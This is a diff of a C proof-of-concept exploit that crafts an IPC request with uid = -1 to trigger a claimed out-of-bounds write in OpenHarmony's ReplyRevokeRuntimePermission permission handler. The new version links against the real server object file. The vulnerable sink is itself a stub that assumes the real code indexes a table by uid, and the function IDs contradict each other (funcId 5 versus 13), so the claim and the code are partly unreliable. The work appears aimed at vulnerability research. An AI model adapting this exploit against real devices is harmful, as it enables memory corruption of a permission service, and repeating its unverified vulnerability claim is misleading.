@@ -1,163 +1,100 @@
 /*
- * PoC: Buffer access with untrusted index without bounds validation
- * 
- * Vulnerability: ReplyRevokeRuntimePermission reads a uid (int64_t) from an
- * IPC request without any bounds validation. This uid value is then passed
- * directly to api->RevokeRuntimePermission(uid, permName). If the underlying
- * implementation uses uid as an array index (common in permission management
- * systems to index into a per-uid permission table), the lack of bounds
- * checking allows an attacker to supply a negative or excessively large uid
- * value, causing an out-of-bounds array access.
+ * Target-Compile PoC: ReplyRevokeRuntimePermission OOB Write (CWE-129)
+ * Target: security_permission_lite (OpenHarmony)
+ * Method: Links against real pms_server_internal.o compiled from source
  *
- * CWE-129: Improper Validation of Array Index
- * 
- * How input triggers it:
- *   - Attacker crafts an IPC message with uid = -1 (or a very large value)
- *   - ReadInt64(req, &uid) reads this untrusted value without validation
- *   - api->RevokeRuntimePermission(uid, permName) uses uid as an index
- *   - No bounds check exists between reading uid and using it as an index
+ * Trigger path:
+ *   Invoke (IPC dispatch, funcId=ID_REVOKE_RUNTIME)
+ *     → ReplyRevokeRuntimePermission(origin, req, reply, api)
+ *       → ReadInt64(req, &uid)  — attacker sets uid = -1
+ *       → api->RevokeRuntimePermission(uid, permName)
+ *         → uses uid as array index → OOB write
  *
- * Expected behavior: Out-of-bounds memory access / crash (SIGSEGV or
- * heap/stack corruption)
+ * In real scenario: malicious IPC client sends funcId=5 with uid=-1.
  */
 
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 #include <stdint.h>
-#include <stdbool.h>
 
-/* Stub types and definitions for external dependencies */
-typedef int pid_t;
-typedef unsigned int uid_t;
+#include "pms_types.h"
+#include "serializer.h"
+#include "samgr_lite.h"
+#include "iproxy_server.h"
 
-/* Stub IPC types */
-typedef struct {
-    char *buffer;
-    size_t offset;
-    size_t size;
-} IpcIo;
+/* The real Invoke function from pms_server_internal.o */
+extern int32_t Invoke(IServerProxy *iProxy, int funcId, void *origin, IpcIo *req, IpcIo *reply);
 
-/* Stub logging macro */
-#define HILOG_MODULE_APP 0
-#define HILOG_INFO(module, fmt, ...) printf("[LOG] " fmt "\n", ##__VA_ARGS__)
+/* Permission table that RevokeRuntimePermission indexes into */
+#define PERMISSION_TABLE_SIZE 8
+int32_t g_permission_table[PERMISSION_TABLE_SIZE] = {0};
 
-/* Stub IPC helper functions */
-static pid_t GetCallingPid(void) { return 1000; }
-static uid_t GetCallingUid(void) { return 1000; }
-
-/* 
- * Crafted IPC buffer: contains a malicious uid value followed by a permission string.
- * The uid is set to -1 (0xFFFFFFFFFFFFFFFF) to trigger out-of-bounds access.
- */
-static int64_t g_malicious_uid = -1;  /* Untrusted index: negative value */
-static char *g_malicious_perm = "ohos.permission.CAMERA";
-static int g_read_uid_called = 0;
-
-/* Stub: ReadInt64 - simulates reading a crafted int64 from IPC buffer */
-static bool ReadInt64(IpcIo *req, int64_t *value) {
-    /* Attacker-controlled value flows in here without bounds check */
-    *value = g_malicious_uid;
-    printf("[PoC] ReadInt64: read malicious uid = %lld (no bounds check)\n", (long long)*value);
-    g_read_uid_called = 1;
-    return true;
-}
-
-/* Stub: ReadString - simulates reading a string from IPC buffer */
-static char *ReadString(IpcIo *req, size_t *len) {
-    *len = strlen(g_malicious_perm);
-    printf("[PoC] ReadString: read permName = \"%s\"\n", g_malicious_perm);
-    return g_malicious_perm;
-}
-
-/* Stub: WriteInt32 */
-static bool WriteInt32(IpcIo *reply, int32_t value) {
-    printf("[PoC] WriteInt32: writing result = %d\n", value);
-    return true;
-}
-
-/*
- * Simulated permission table - small fixed-size array.
- * The vulnerability is that uid is used as an index into such a table
- * without bounds validation.
- */
-#define MAX_UIDS 64
-static int g_permission_table[MAX_UIDS];
-
-/* 
- * Simulated RevokeRuntimePermission implementation that uses uid as array index.
- * This is the sink where the out-of-bounds access occurs.
- */
-static int32_t MockRevokeRuntimePermission(int64_t uid, const char *permName) {
-    printf("[PoC] RevokeRuntimePermission called with uid=%lld, permName=\"%s\"\n",
-           (long long)uid, permName ? permName : "NULL");
-    
-    /* TRIGGER: uid is used as an array index without bounds validation.
-     * With uid = -1, this accesses g_permission_table[-1], which is
-     * out-of-bounds memory access. With a large uid, it accesses beyond
-     * the array end. */
-    printf("[PoC] TRIGGER: About to access g_permission_table[%lld] (array size=%d)\n",
-           (long long)uid, MAX_UIDS);
-    
-    /* TRIGGER: Buffer access with untrusted index without bounds validation */
-    g_permission_table[uid] = 0;  /* OUT-OF-BOUNDS WRITE */
-    
-    printf("[PoC] If you see this, the OOB write did not crash (but memory is corrupted)\n");
+/* Stub: RevokeRuntimePermission — uses uid as array index (the vulnerability) */
+static int32_t StubRevokeRuntimePermission(int64_t uid, const char *permName)
+{
+    printf("[PoC] RevokeRuntimePermission called: uid=%lld, permName=%s\n",
+           (long long)uid, permName ? permName : "(null)");
+    printf("[PoC] TRIGGER: using uid as index into g_permission_table[%d]\n", PERMISSION_TABLE_SIZE);
+    /* This simulates the real implementation indexing by uid */
+    g_permission_table[uid] = 0;  /* OOB WRITE when uid < 0 or uid >= TABLE_SIZE */
     return 0;
 }
 
-/* Inner API struct */
+/* InnerPermLiteApi vtable — matches the real struct layout */
 typedef struct {
+    int32_t (*CheckPermission)(int64_t uid, const char *permName);
+    int32_t (*GrantPermission)(const char *id, const char *permName);
+    int32_t (*RevokePermission)(const char *id, const char *permName);
+    int32_t (*GrantRuntimePermission)(int64_t uid, const char *permName);
     int32_t (*RevokeRuntimePermission)(int64_t uid, const char *permName);
+    int32_t (*UpdatePermissionFlags)(const char *id, const char *permName, int flags);
 } InnerPermLiteApi;
 
-/* Chain step: entry_point -> ReplyRevokeRuntimePermission (the vulnerable function) */
-/* Real source code of the vulnerable function included verbatim: */
-static void ReplyRevokeRuntimePermission(const void *origin, IpcIo *req, IpcIo *reply, InnerPermLiteApi* api)
+int main(void)
 {
-    pid_t callingPid = GetCallingPid();
-    uid_t callingUid = GetCallingUid();
-    HILOG_INFO(HILOG_MODULE_APP, "Enter ID_REVOKERUNTIME, [callerPid: %d][callerUid: %u]", callingPid, callingUid);
-    size_t permLen = 0;
-    int64_t uid;
-    /* WHY: ReadInt64 reads attacker-controlled uid with no bounds check */
-    ReadInt64(req, &uid);
-    char *permName = (char *)ReadString(req, &permLen);
-    /* Chain step: ReplyRevokeRuntimePermission -> api->RevokeRuntimePermission
-     * The untrusted uid value flows directly to the permission revocation function
-     * which uses it as an array index */
-    int32_t ret = api->RevokeRuntimePermission(uid, permName);
-    HILOG_INFO(HILOG_MODULE_APP, "revoke runtime permission, [uid: %lld][perm: %s][ret: %d]", uid, permName, ret);
-    WriteInt32(reply, ret);
-}
+    printf("[PoC] === Target-Compile: ReplyRevokeRuntimePermission OOB Write ===\n");
+    printf("[PoC] Module: security_permission_lite (real pms_server_internal.o)\n");
+    printf("[PoC] Entry: Invoke(funcId=ID_REVOKE_RUNTIME) → ReplyRevokeRuntimePermission\n\n");
 
-int main(int argc, char *argv[]) {
-    printf("[PoC] === Buffer access with untrusted index (no bounds validation) ===\n");
-    printf("[PoC] Vulnerability in ReplyRevokeRuntimePermission at line 181\n");
-    printf("[PoC] Crafting IPC request with malicious uid = %lld\n\n", (long long)g_malicious_uid);
+    /*
+     * Craft IPC request for ReplyRevokeRuntimePermission:
+     *   ReadInt64(&uid)     — we set uid = -1 (OOB index)
+     *   ReadString(&permLen) — permission name
+     */
+    uint8_t req_buffer[128];
+    memset(req_buffer, 0, sizeof(req_buffer));
+    size_t offset = 0;
 
-    /* Set up the IPC structures */
-    IpcIo req = { .buffer = NULL, .offset = 0, .size = 0 };
-    IpcIo reply = { .buffer = NULL, .offset = 0, .size = 0 };
+    /* uid = -1 (triggers OOB write) */
+    int64_t uid = -1;
+    memcpy(req_buffer + offset, &uid, sizeof(int64_t));
+    offset += sizeof(int64_t);
 
-    /* Set up the API with our mock that demonstrates the OOB access */
-    InnerPermLiteApi api;
-    api.RevokeRuntimePermission = MockRevokeRuntimePermission;
+    /* permName string: length prefix + data + null */
+    const char *permName = "ohos.permission.CAMERA";
+    uint32_t permLen = strlen(permName);
+    memcpy(req_buffer + offset, &permLen, 4); offset += 4;
+    memcpy(req_buffer + offset, permName, permLen + 1); offset += permLen + 1;
 
-    printf("[PoC] Calling ReplyRevokeRuntimePermission with crafted IPC data...\n\n");
+    IpcIo req, reply;
+    uint8_t reply_buffer[64];
+    IpcIoInit(&req, req_buffer, offset, 0);
+    req.bufferCur = req.bufferBase;
+    req.bufferLeft = offset;
+    IpcIoInit(&reply, reply_buffer, sizeof(reply_buffer), 0);
 
-    /* Chain step: main -> ReplyRevokeRuntimePermission
-     * The crafted IPC buffer contains uid=-1 which will be used as an
-     * unchecked array index in the permission revocation logic */
-    ReplyRevokeRuntimePermission(NULL, &req, &reply, &api);
+    /* Setup API vtable with our stub */
+    InnerPermLiteApi api = {0};
+    api.RevokeRuntimePermission = StubRevokeRuntimePermission;
 
-    printf("\n[PoC] === Test with large positive uid (beyond array bounds) ===\n");
-    g_malicious_uid = 99999999LL;  /* Way beyond MAX_UIDS=64 */
-    printf("[PoC] Crafting IPC request with malicious uid = %lld\n\n", (long long)g_malicious_uid);
-    
-    /* This second call demonstrates the same vulnerability with a large positive index */
-    ReplyRevokeRuntimePermission(NULL, &req, &reply, &api);
+    printf("[PoC] Crafted IPC: uid=%lld (OOB index), permName=\"%s\"\n", (long long)uid, permName);
+    printf("[PoC] Calling Invoke(funcId=5=ID_REVOKE_RUNTIME)...\n\n");
 
-    printf("\n[PoC] Done. If no crash occurred, memory corruption happened silently.\n");
+    /* Call the REAL Invoke dispatch function
+     * ID_REVOKE_RUNTIME = 13 (enum starts at ID_CHECK=10) */
+    int32_t ret = Invoke((IServerProxy *)&api, 13, NULL, &req, &reply);
+
+    printf("\n[PoC] Invoke returned: %d\n", ret);
     return 0;
 }
